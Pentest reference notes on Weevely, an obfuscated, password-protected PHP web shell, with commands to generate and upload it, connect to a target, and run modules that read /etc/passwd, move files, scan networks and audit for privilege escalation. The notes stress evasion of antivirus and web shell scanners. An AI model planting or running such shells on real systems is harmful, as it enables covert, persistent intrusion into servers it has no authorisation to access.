---
tags: [pentest, shells, webshell, php, weevely, stealth, initial-access, web]
tool: weevely
phase: 5
---
# Weevely — Stealth PHP Web Shell

Password-protected, obfuscated PHP web shell with built-in modules for post-exploitation. Harder to detect than plain `system()` shells.

[[00 - README|Folder index]]

## Install / verify

```bash
which weevely
sudo apt install weevely
```

## Generate the shell

```bash
weevely generate <password> /tmp/shell.php
```

This creates an obfuscated PHP file — no obvious `system()` or `exec()` calls.

## Upload and connect

```bash
# Upload shell.php to the target via whatever vector (upload vuln, FTP, etc.)
# Then connect:
weevely http://target/shell.php <password>
```

## Built-in modules

```bash
# Inside weevely session:
:help                         # list all modules

# File operations
:file_read /etc/passwd
:file_upload /local/file /remote/path
:file_download /remote/file /local/path

# System info
:system_info
:system_procs

# Network
:net_ifconfig
:net_scan <subnet> <ports>

# Database
:sql_console -u root -p pass

# Privilege escalation
:audit_suidsgid
:audit_filesystem
```

## Why Weevely over a plain PHP shell

| Feature | Plain PHP shell | Weevely |
| --- | --- | --- |
| Password protected | No | Yes |
| Obfuscated | No | Yes |
| AV detection | High | Low |
| Built-in modules | No | 30+ modules |
| File transfer | Manual | Built-in |
| Encrypted comms | No | Yes (AES) |

> [!tip] Persistence + stealth
> Weevely's obfuscation means it often survives basic web shell scanning. The password protection means even if someone finds the file, they can't use it.

## See also

- [[08 - PHP Web Shells]]
